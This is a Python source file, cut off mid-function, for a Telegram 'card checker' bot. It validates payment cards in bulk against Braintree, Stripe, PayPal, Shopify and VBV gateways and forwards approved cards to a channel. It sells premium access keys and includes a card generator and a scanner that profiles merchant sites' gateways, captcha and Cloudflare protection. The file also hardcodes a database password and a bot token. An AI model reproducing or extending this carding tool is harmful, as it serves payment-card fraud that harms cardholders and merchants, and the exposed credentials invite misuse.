from gen import CardGenerator
from braintree_checker import check_card_braintree, check_cards_braintree, initialize_braintree
from fake import generate_identity
import telebot
from flask import Flask
import threading
import re
import os
import io
import time
import json
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
from ch import check_card_stripe, check_cards_stripe
from st import check_single_cc, check_mass_cc, test_charge
from payp import check_card_paypal  
from sh import check_card_shopify, check_cards_shopify
from sk import check_card_hosted, check_cards_mass
from vbv import check_card_vbv, check_cards_vbv
import mysql.connector
from mysql.connector import pooling
import requests
import socket
import ssl
import whois
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Global variables to control mass checking
MASS_CHECK_ACTIVE = {
    'mch': False,
    'mbr': False, 
    'mpp': False,
    'msh': False,
    'mst': False,
    'msk': False,
    'mvbv': False
}

# Mass check tracking
MASS_CHECK_SESSIONS = {}
MASS_CHECK_APPROVED_CARDS = {}  # Store approved cards by session

# Temporary storage for mass check data
TEMP_MASS_DATA = {}

APPROVED_CHANNEL_ID = "-1003290219349"  # Channel to forward approved cards

initialize_braintree()

# Maintenance flags for all gateways
PAYPAL_MAINTENANCE = False
BRAINTREE_MAINTENANCE = False
STRIPE_AUTH_MAINTENANCE = False
STRIPE_CHARGE_MAINTENANCE = False
SHOPIFY_MAINTENANCE = False
STRIPE_SK_MAINTENANCE = False
VBV_MAINTENANCE = False

# --- Gateway Scanner Constants ---
PAYMENT_GATEWAYS = sorted(list(set([
    # Major Global Players
    "Stripe", "PayPal", "Square", "Adyen", "Braintree", "Worldpay", "Checkout.com", 
    "Authorize.Net", "2Checkout", "Verifone", "Ingenico", "Global Payments",
    # E-commerce Platforms
    "Shopify", "Shopify Payments", "WooCommerce", "BigCommerce", "Magento", "Magento Payments", 
    "OpenCart", "PrestaShop", "Ecwid", "Volusion",
    # Regional & International
    "Mollie", "Klarna", "PayU", "Razorpay", "Paytm", "Mercado Pago", "PagSeguro", 
    "dLocal", "Alipay", "WeChat Pay", "Skrill", "Payoneer", "Afterpay", "Affirm", 
    "GoCardless", "SecurionPay", "Paysafe", "HiPay", "Paycomet", "Realex Payments",
    "eWay", "Paystack", "Flutterwave", "Yandex.Kassa", "Qiwi", "Dragonpay",
    # Subscription & Recurring Billing
    "Recurly", "Chargify", "Chargebee", "Zuora",
    # Crypto Gateways
    "Coinbase", "Coinbase Commerce", "BitPay", "CoinPayments", "Crypto.com Pay", "Utrust",
    # US & North America Focused
    "PayJunction", "PaySimple", "BluePay", "CardConnect", "Clover", "Heartland Payment Systems",
    "Elavon", "First Data", "Vantiv", "Chase Paymentech", "Moneris", "USAePay", 
    "eProcessing", "Cardknox", "Payeezy", "PayFlow", "Fluidpay", "LawPay",
    # Other Specific/Niche Gateways
    "Amazon Pay", "Apple Pay", "Google Pay", "WePay", "Blackbaud", "Sage Pay", "SagePayments",
    "Auruspay", "CyberSource", "Rocketgate", "NMI", "Network Merchants", "Paytrace",
    "Ebizcharge", "Convergepay", "Oceanpayments",
    # Common Variations & Technical Names
    "auth.net", "Authnet", "cybersource", "payflow", "worldpay.com", "securepay", 
    "hostedpayments", "geomerchant", "creo", "cpay", "matt sorra", "Ebiz"
])))

SECURITY_INDICATORS = {
    'captcha': ['captcha', 'protected by recaptcha', "i'm not a robot", 'recaptcha/api.js', 'hcaptcha'],
    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com', '/cdn-cgi/']
}

# --- Gateway Scanner Functions ---
def normalize_url(url):
    """Normalize URL by adding http:// if missing"""
    if not re.match(r'^https?://', url, re.I):
        return 'http://' + url
    return url

def get_server_details(url):
    """Get server details including IP, host, SSL info"""
    try:
        hostname = urlparse(url).hostname
        if not hostname: 
            return {'ip': 'N/A', 'host': 'N/A', 'ssl_active': 'N/A', 'ssl_issuer': 'N/A'}
        ip_address = socket.gethostbyname(hostname)
        host_org = 'N/A'
        try:
            w = whois.whois(hostname)
            if w and w.org: 
                host_org = w.org
        except Exception: 
            pass
        ssl_active, ssl_issuer = False, 'N/A'
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    ssl_active = True
                    issuer = dict(x[0] for x in cert['issuer'])
                    ssl_issuer = issuer.get('organizationName', 'N/A')
        except Exception: 
            pass
        return {'ip': ip_address, 'host': host_org, 'ssl_active': 'Yes' if ssl_active else 'No', 'ssl_issuer': ssl_issuer}
    except Exception:
        return {'ip': 'N/A', 'host': 'N/A', 'ssl_active': 'N/A', 'ssl_issuer': 'N/A'}

def process_url(url):
    """Process URL to detect payment gateways and security"""
    normalized_url = normalize_url(url)
    result = {'url': normalized_url, 'gateways': [], 'captcha': False, 'cloudflare': False, 'server_details': {}, 'web_server': 'N/A', 'error': None}
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(normalized_url, timeout=10, headers=headers)
        response.raise_for_status()
        content = response.text
        content_lower = content.lower()
        detected = set()
        for gateway in PAYMENT_GATEWAYS:
            if re.search(r'\b' + re.escape(gateway.lower()) + r'\b', content_lower):
                detected.add(gateway)
        result['gateways'] = sorted(list(detected))
        result['captcha'] = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['captcha'])
        result['cloudflare'] = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['cloudflare'])
        result['server_details'] = get_server_details(normalized_url)
        result['web_server'] = response.headers.get('Server', 'N/A')
    except requests.RequestException as e:
        result['error'] = str(e)
    return result

# Database connection pool with proper configuration for Render - FIXED: Removed unsupported parameter
db_pool = pooling.MySQLConnectionPool(
    pool_name="bot_pool",
    pool_size=3,  # Reduced from 5 to 3 to prevent connection limits
    pool_reset_session=True,
    host="sql12.freesqldatabase.com",
    user="sql12802422",
    password="JJ3hSnN2aC",
    database="sql12802422",
    port=3306,
    autocommit=True,
    connect_timeout=30
    # Removed: connection_attributes=True as it's not supported
)

# Database connection function with connection pooling and better error handling
def connect_db():
    try:
        connection = db_pool.get_connection()
        if connection.is_connected():
            return connection
        else:
            print("❌ Failed to get database connection")
            return None
    except mysql.connector.Error as err:
        print(f"❌ Database connection error: {err}")
        # Try to recreate pool if there's an issue
        if "Too many connections" in str(err):
            print("🔄 Too many connections detected, waiting and retrying...")
            time.sleep(2)
            try:
                connection = db_pool.get_connection()
                return connection
            except:
                pass
        return None

# Add this function to send notifications to admin
def notify_admin(message):
    """Send notification to main admin"""
    try:
        send_long_message(MAIN_ADMIN_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send admin notification: {e}")

# Add this function to send approved cards to channel
def notify_channel(message):
    """Send approved card to channel with length checking"""
    try:
        send_long_message(APPROVED_CHANNEL_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send channel notification: {e}")

# Cache for frequently accessed data
user_cache = {}
cache_timeout = 300  # 5 minutes

# Helper function to handle long messages
def send_long_message(chat_id, text, parse_mode=None, reply_to_message_id=None):
    """Send long messages by splitting them into multiple parts if needed"""
    MAX_MESSAGE_LENGTH = 4096
    
    if len(text) <= MAX_MESSAGE_LENGTH:
        # Message is within limit, send normally
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
    
    # Split message into parts
    messages = []
    lines = text.split('\n')
    current_message = ""
    
    for line in lines:
        # Check if adding this line would exceed the limit
        if len(current_message) + len(line) + 1 > MAX_MESSAGE_LENGTH:
            # If current message has content, add it to messages
            if current_message:
                messages.append(current_message)
                current_message = ""
            
            # If a single line is too long, split it
            if len(line) > MAX_MESSAGE_LENGTH:
                # Split the long line into chunks
                chunks = [line[i:i+MAX_MESSAGE_LENGTH] for i in range(0, len(line), MAX_MESSAGE_LENGTH)]
                for chunk in chunks[:-1]:
                    messages.append(chunk)
                current_message = chunks[-1]
            else:
                current_message = line
        else:
            if current_message:
                current_message += '\n' + line
            else:
                current_message = line
    
    # Add the last message if any
    if current_message:
        messages.append(current_message)
    
    # Send all messages
    sent_messages = []
    for i, message_text in enumerate(messages):
        try:
            if i == 0 and reply_to_message_id:
                msg = bot.send_message(chat_id, message_text, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
            else:
                msg = bot.send_message(chat_id, message_text, parse_mode=parse_mode)
            sent_messages.append(msg)
        except Exception as e:
            print(f"Error sending message part {i}: {e}")
    
    return sent_messages

def edit_long_message(chat_id, message_id, text, parse_mode=None):
    """Edit long messages by splitting them into multiple parts if needed"""
    MAX_MESSAGE_LENGTH = 4096
    
    if len(text) <= MAX_MESSAGE_LENGTH:
        # Message is within limit, edit normally
        try:
            return bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode)
        except Exception as e:
            print(f"Error editing message: {e}")
            return None
    
    # For long messages, we need to delete the original and send new ones
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    
    return send_long_message(chat_id, text, parse_mode=parse_mode)

# Stats tracking functions
def update_stats(approved=0, declined=0):
    """Update global statistics in database"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return
            
        cursor = conn.cursor()
        
        # Update bot_stats table
        cursor.execute("""
            UPDATE bot_stats 
            SET total_cards_checked = total_cards_checked + %s,
                total_approved_cards = total_approved_cards + %s,
                total_declined_cards = total_declined_cards + %s
            WHERE id = 1
        """, (approved + declined, approved, declined))
        
        # Update daily_stats table
        cursor.execute("""
            INSERT INTO daily_stats (date, cards_checked, approved_cards, declined_cards, total_users)
            VALUES (CURDATE(), %s, %s, %s, %s)
            ON DUPLICATE KEY UPDATE 
                cards_checked = cards_checked + VALUES(cards_checked),
                approved_cards = approved_cards + VALUES(approved_cards),
                declined_cards = declined_cards + VALUES(declined_cards),
                total_users = VALUES(total_users)
        """, (approved + declined, approved, declined, get_total_users()))
        
        conn.commit()
        
    except Exception as e:
        print(f"Error updating stats: {e}")
    finally:
        if conn and conn.is_connected():
            conn.close()

def update_user_stats(user_id, approved=False):
    """Update user statistics"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return
            
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO user_stats (user_id, total_checks, approved_checks, declined_checks, last_used)
            VALUES (%s, 1, %s, %s, NOW())
            ON DUPLICATE KEY UPDATE 
                total_checks = total_checks + 1,
                approved_checks = approved_checks + %s,
                declined_checks = declined_checks + %s,
                last_used = NOW()
        """, (user_id, 1 if approved else 0, 0 if approved else 1, 1 if approved else 0, 0 if approved else 1))
        
        conn.commit()
        
    except Exception as e:
        print(f"Error updating user stats: {e}")
    finally:
        if conn and conn.is_connected():
            conn.close()

def get_stats_from_db():
    """Get statistics from database"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return None
            
        cursor = conn.cursor(dictionary=True)
        
        # Get overall stats
        cursor.execute("SELECT * FROM bot_stats WHERE id = 1")
        bot_stats = cursor.fetchone()
        
        # Get today's stats
        cursor.execute("SELECT * FROM daily_stats WHERE date = CURDATE()")
        daily_stats = cursor.fetchone()
        
        # Get total users
        total_users = get_total_users()
        
        return {
            'total_cards': bot_stats['total_cards_checked'] if bot_stats else 0,
            'total_approved': bot_stats['total_approved_cards'] if bot_stats else 0,
            'total_declined': bot_stats['total_declined_cards'] if bot_stats else 0,
            'today_cards': daily_stats['cards_checked'] if daily_stats else 0,
            'today_approved': daily_stats['approved_cards'] if daily_stats else 0,
            'today_declined': daily_stats['declined_cards'] if daily_stats else 0,
            'total_users': total_users
        }
        
    except Exception as e:
        print(f"Error getting stats from DB: {e}")
        return None
    finally:
        if conn and conn.is_connected():
            conn.close()

def get_total_users():
    """Get total number of users from database"""
    cache_key = "total_users"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return 0
            
        cursor = conn.cursor()
        
        # Count free users
        cursor.execute("SELECT COUNT(*) FROM free_users")
        free_count = cursor.fetchone()[0]
        
        # Count premium users
        cursor.execute("SELECT COUNT(*) FROM premium_users WHERE subscription_expiry > NOW()")
        premium_count = cursor.fetchone()[0]
        
        total = free_count + premium_count
        
        # Cache the result
        user_cache[cache_key] = {'result': total, 'time': time.time()}
        return total
        
    except Exception as e:
        print(f"Error getting total users: {e}")
        return 0
    finally:
        if conn and conn.is_connected():
            conn.close()

def add_free_user(user_id, first_name):
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute(
            "INSERT IGNORE INTO free_users (user_id, first_name) VALUES (%s, %s)",
            (user_id, first_name)
        )
        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error adding free user: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def store_key(key, validity_days):
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO premium_keys (`key`, validity_days) VALUES (%s, %s)",
            (key, validity_days)
        )
        conn.commit()
        return True
    except Exception as e:
        print(f"Error storing key: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def is_key_valid(key):
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return None
        cursor = conn.cursor(dictionary=True)
        cursor.execute(
            "SELECT * FROM premium_keys WHERE `key` = %s AND used_by IS NULL AND revoked = 0",
            (key,)
        )
        result = cursor.fetchone()
        return result
    except Exception as e:
        print(f"Error checking key validity: {e}")
        return None
    finally:
        if conn and conn.is_connected():
            conn.close()

def mark_key_as_used(key, user_id):
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE premium_keys SET used_by = %s, used_at = NOW() WHERE `key` = %s AND revoked = 0",
            (user_id, key)
        )
        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error marking key as used: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def revoke_key(key):
    """Revoke a premium key"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE premium_keys SET revoked = 1 WHERE `key` = %s",
            (key,)
        )
        conn.commit()
        return cursor.rowcount > 0
    except Exception as e:
        print(f"Error revoking key: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def delete_key(key):
    """Delete a premium key"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute(
            "DELETE FROM premium_keys WHERE `key` = %s",
            (key,)
        )
        conn.commit()
        return cursor.rowcount > 0
    except Exception as e:
        print(f"Error deleting key: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def get_all_keys():
    """Get all premium keys"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return []
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT * FROM premium_keys ORDER BY created_at DESC")
        return cursor.fetchall()
    except Exception as e:
        print(f"Error getting keys: {e}")
        return []
    finally:
        if conn and conn.is_connected():
            conn.close()

def add_premium(user_id, first_name, validity_days):
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        expiry_date = datetime.now() + timedelta(days=validity_days)

        cursor.execute("""
            INSERT INTO premium_users (user_id, first_name, subscription_expiry)
            VALUES (%s, %s, %s)
            ON DUPLICATE KEY UPDATE
                first_name = VALUES(first_name),
                subscription_start = CURRENT_TIMESTAMP,
                subscription_expiry = VALUES(subscription_expiry)
        """, (user_id, first_name, expiry_date))

        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error adding premium user: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def remove_premium(user_id):
    """Remove premium subscription from user"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute("DELETE FROM premium_users WHERE user_id = %s", (user_id,))
        conn.commit()
        
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
                
        return cursor.rowcount > 0
    except Exception as e:
        print(f"Error removing premium user: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def is_premium(user_id):
    """Check if user has premium subscription"""
    # Admins are always premium
    if is_admin(user_id):
        return True
    
    # Check cache first
    cache_key = f"premium_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    # Check premium_users table
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()

        premium_result = False
        if result:
            expiry = result['subscription_expiry']
            if expiry is None:
                premium_result = False
            else:
                # Convert to datetime object if it's a string
                if isinstance(expiry, str):
                    expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                premium_result = expiry > datetime.now()
        
        # Cache the result
        user_cache[cache_key] = {'result': premium_result, 'time': time.time()}
        return premium_result
    except Exception as e:
        print(f"Error checking premium status: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

card_generator = CardGenerator()

# BOT Configuration
BOT_TOKEN = '8255649562:AAEGZBdRp3Di37EA88T5YrWnk5TWMepG_Wo'
MAIN_ADMIN_ID = 5103348494
CHANNEL_ID = 5103348494  # Your channel ID

# SINGLE BOT INSTANCE - FIX FOR CONFLICT ERROR
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=10)
bot.skip_pending = True  # Skip pending messages on start

FREE_USER_COOLDOWN = {}  # For anti-spam system

# ---------------- Helper Functions ---------------- #

def load_admins():
    """Load admin list from database"""
    cache_key = "admins_list"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return [MAIN_ADMIN_ID]
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM admins")
        admins = [row[0] for row in cursor.fetchall()]
        # Cache the result
        user_cache[cache_key] = {'result': admins, 'time': time.time()}
        return admins
    except Exception as e:
        print(f"Error loading admins: {e}")
        return [MAIN_ADMIN_ID]
    finally:
        if conn and conn.is_connected():
            conn.close()

def save_admins(admins):
    """Save admin list to database"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        
        # Clear existing admins
        cursor.execute("DELETE FROM admins")
        
        # Insert new admins
        for admin_id in admins:
            cursor.execute("INSERT INTO admins (user_id) VALUES (%s)", (admin_id,))
        
        conn.commit()
        # Clear cache
        if "admins_list" in user_cache:
            del user_cache["admins_list"]
        return True
    except Exception as e:
        print(f"Error saving admins: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def is_admin(user_id):
    """Check if user is an admin"""
    # Convert to int for comparison
    try:
        user_id_int = int(user_id)
    except (ValueError, TypeError):
        return False
        
    # Always check MAIN_ADMIN_ID first
    if user_id_int == MAIN_ADMIN_ID:
        return True
        
    admins = load_admins()
    return user_id_int in admins

def is_authorized(msg):
    """Check if user is authorized"""
    user_id = msg.from_user.id
    chat = msg.chat

    # ✅ Allow all admins anywhere
    if is_admin(user_id):
        return True

    # ✅ Allow all premium users
    if is_premium(user_id):
        return True

    # ✅ If message is from group and group is authorized - FIXED: Check database for authorized groups
    if chat.type in ["group", "supergroup"]:
        return is_group_authorized(chat.id)

    # ✅ If private chat, check if user is in free_users table
    if chat.type == "private":
        # Check cache first
        cache_key = f"free_user_{user_id}"
        if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
            return user_cache[cache_key]['result']
            
        conn = None
        try:
            conn = connect_db()
            if not conn:
                return False
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
            result = cursor.fetchone()
            # Cache the result
            user_cache[cache_key] = {'result': result is not None, 'time': time.time()}
            return result is not None
        except Exception as e:
            print(f"Error checking free user: {e}")
            return False
        finally:
            if conn and conn.is_connected():
                conn.close()

    return False

def normalize_card(text):
    """
    Normalize credit card from any format to cc|mm|yy|cvv
    Similar to PHP normalize_card function
    """
    if not text:
        return None

    # Replace newlines and slashes with spaces
    text = text.replace('\n', ' ').replace('/', ' ')

    # Find all numbers in the text
    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for part in numbers:
        if len(part) == 16:  # Credit card number
            cc = part
        elif len(part) == 4 and part.startswith('20'):  # 4-digit year starting with 20
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':  # Month (2 digits <= 12)
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':  # 2-digit year
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':  # CVV (3-4 digits)
            cvv = part

    # Check if we have all required parts
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"

    return None

def get_user_info(user_id):
    """Get user info for display in responses"""
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"User {user_id}"
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        # Check admin status first, before other checks
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            # Check if user is in free_users table
            conn = None
            try:
                conn = connect_db()
                if not conn:
                    user_type = "Unknown User ❓"
                else:
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
                    free_user = cursor.fetchone()
                    
                    if free_user:
                        user_type = "Free User 🔓"
                    else:
                        user_type = "Unauthorized User ❌"
            except Exception as e:
                print(f"Error checking user type: {e}")
                user_type = "Unknown User ❓"
            finally:
                if conn and conn.is_connected():
                    conn.close()
                
        return {
            "username": username,
            "full_name": full_name,
            "user_type": user_type,
            "user_id": user_id
        }
        
    except:
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            user_type = "Unknown User ❓"
                
        return {
            "username": f"User {user_id}",
            "full_name": f"User {user_id}",
            "user_type": user_type,
            "user_id": user_id
        }

def check_proxy_status():
    """Check if proxy is live or dead"""
    try:
        # Simple check by trying to access a reliable site
        import requests
        test_url = "https://www.google.com"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            return "Live ✅"
        else:
            return "Dead ❌"
    except:
        return "Dead ❌"

def get_subscription_info(user_id):
    """Get subscription information for a user"""
    if is_admin(user_id):
        return ("Unlimited ♾️", "Never")
    
    # Check premium_users table
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return ("Error ❌", "N/A")
            
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
        result_db = cursor.fetchone()

        if result_db:
            expiry = result_db['subscription_expiry']
            if expiry is None:
                return ("No subscription ❌", "N/A")
            else:
                # Convert to datetime object if it's a string
                if isinstance(expiry, str):
                    expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                
                remaining_days = (expiry - datetime.now()).days
                if remaining_days < 0:
                    return ("Expired ❌", expiry.strftime("%Y-%m-%d %H:%M:%S"))
                else:
                    return (f"{remaining_days} days", expiry.strftime("%Y-%m-%d %H:%M:%S"))
        else:
            return ("No subscription ❌", "N/A")
    except Exception as e:
        print(f"Error getting subscription info: {e}")
        return ("Error ❌", "N/A")
    finally:
        if conn and conn.is_connected():
            conn.close()

def check_cooldown(user_id, command_type):
    """Check if user is in cooldown period"""
    current_time = time.time()
    user_id_str = str(user_id)
    
    # Admins and premium users have no cooldown
    if is_admin(user_id) or is_premium(user_id):
        return False
        
    # Check if user is in cooldown
    if user_id_str in FREE_USER_COOLDOWN:
        if command_type in FREE_USER_COOLDOWN[user_id_str]:
            if current_time < FREE_USER_COOLDOWN[user_id_str][command_type]:
                return True
    
    return False

def set_cooldown(user_id, command_type, duration):
    """Set cooldown for a user"""
    user_id_str = str(user_id)
    
    # Don't set cooldown for admins and premium users
    if is_admin(user_id) or is_premium(user_id):
        return
    
    if user_id_str not in FREE_USER_COOLDOWN:
        FREE_USER_COOLDOWN[user_id_str] = {}
    
    FREE_USER_COOLDOWN[user_id_str][command_type] = time.time() + duration

# For groups - FIXED: Using database instead of JSON file
def load_authorized_groups():
    """Load authorized groups from database"""
    cache_key = "authorized_groups"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return []
        cursor = conn.cursor()
        cursor.execute("SELECT group_id FROM authorized_groups")
        groups = [row[0] for row in cursor.fetchall()]
        # Cache the result
        user_cache[cache_key] = {'result': groups, 'time': time.time()}
        return groups
    except Exception as e:
        print(f"Error loading authorized groups: {e}")
        return []
    finally:
        if conn and conn.is_connected():
            conn.close()

def save_authorized_groups(groups):
    """Save authorized groups to database"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        
        # Clear existing groups
        cursor.execute("DELETE FROM authorized_groups")
        
        # Insert new groups
        for group_id in groups:
            cursor.execute("INSERT INTO authorized_groups (group_id) VALUES (%s)", (group_id,))
        
        conn.commit()
        # Clear cache
        if "authorized_groups" in user_cache:
            del user_cache["authorized_groups"]
        return True
    except Exception as e:
        print(f"Error saving authorized groups: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def add_authorized_group(group_id):
    """Add authorized group to database"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        
        # Check if group already exists
        cursor.execute("SELECT * FROM authorized_groups WHERE group_id = %s", (group_id,))
        existing = cursor.fetchone()
        
        if not existing:
            cursor.execute("INSERT INTO authorized_groups (group_id) VALUES (%s)", (group_id,))
            conn.commit()
            
        # Clear cache
        if "authorized_groups" in user_cache:
            del user_cache["authorized_groups"]
        return True
    except Exception as e:
        print(f"Error adding authorized group: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def remove_authorized_group(group_id):
    """Remove authorized group from database"""
    conn = None
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        cursor.execute("DELETE FROM authorized_groups WHERE group_id = %s", (group_id,))
        conn.commit()
        # Clear cache
        if "authorized_groups" in user_cache:
            del user_cache["authorized_groups"]
        return cursor.rowcount > 0
    except Exception as e:
        print(f"Error removing authorized group: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def is_group_authorized(group_id):
    """Check if group is authorized"""
    return group_id in load_authorized_groups()

# ---------------- Mass Check Session Management ---------------- #

def create_mass_check_session(user_id, gateway, total_cards, message_id, output_format="message"):
    """Create a new mass check session"""
    session_id = f"{user_id}_{gateway}_{int(time.time())}"
    MASS_CHECK_SESSIONS[session_id] = {
        'user_id': user_id,
        'gateway': gateway,
        'total_cards': total_cards,
        'current_card': 0,
        'approved': 0,
        'declined': 0,
        'message_id': message_id,
        'paused': False,
        'cancelled': False,
        'start_time': time.time(),
        'chat_id': None,
        'output_format': output_format  # "message" or "txt"
    }
    
    # Initialize approved cards storage
    MASS_CHECK_APPROVED_CARDS[session_id] = []
    
    return session_id

def get_mass_check_session(user_id, gateway):
    """Get active mass check session for user"""
    for session_id, session in MASS_CHECK_SESSIONS.items():
        if (session['user_id'] == user_id and 
            session['gateway'] == gateway and 
            not session['cancelled']):
            return session_id, session
    return None, None

def update_mass_check_progress(session_id, current_card, approved, declined):
    """Update mass check progress"""
    if session_id in MASS_CHECK_SESSIONS:
        MASS_CHECK_SESSIONS[session_id]['current_card'] = current_card
        MASS_CHECK_SESSIONS[session_id]['approved'] = approved
        MASS_CHECK_SESSIONS[session_id]['declined'] = declined

def add_approved_card(session_id, card_result):
    """Add approved card to session storage"""
    if session_id in MASS_CHECK_APPROVED_CARDS:
        MASS_CHECK_APPROVED_CARDS[session_id].append(card_result)

def get_approved_cards(session_id):
    """Get approved cards for session"""
    return MASS_CHECK_APPROVED_CARDS.get(session_id, [])

def pause_mass_check(session_id):
    """Pause a mass check session"""
    if session_id in MASS_CHECK_SESSIONS:
        MASS_CHECK_SESSIONS[session_id]['paused'] = True
        return True
    return False

def resume_mass_check(session_id):
    """Resume a mass check session"""
    if session_id in MASS_CHECK_SESSIONS:
        MASS_CHECK_SESSIONS[session_id]['paused'] = False
        return True
    return False

def cancel_mass_check(session_id):
    """Cancel a mass check session"""
    if session_id in MASS_CHECK_SESSIONS:
        MASS_CHECK_SESSIONS[session_id]['cancelled'] = True
        # Also update the global flag
        gateway_key = MASS_CHECK_SESSIONS[session_id]['gateway']
        MASS_CHECK_ACTIVE[gateway_key] = False
        return True
    return False

def get_mass_check_stats_message(session, gateway_name):
    """Generate mass check stats message with inline buttons"""
    #elapsed_time = time.time() - session['start_time']
    progress = (session['current_card'] / session['total_cards']) * 100 if session['total_cards'] > 0 else 0
    
    message = f"""
🎯 *{gateway_name} Mass Check*

📊 *Progress*: `{session['current_card']}/{session['total_cards']}` ({progress:.1f}%)

✅ *Approved*: `{session['approved']}`
❌ *Declined*: `{session['declined']}`

🔄 *Status*: {'⏸️ PAUSED' if session['paused'] else '▶️ RUNNING'}
📤 *Output*: {'📝 Text File' if session.get('output_format') == 'txt' else '💬 Message'}
"""

    # Create inline keyboard
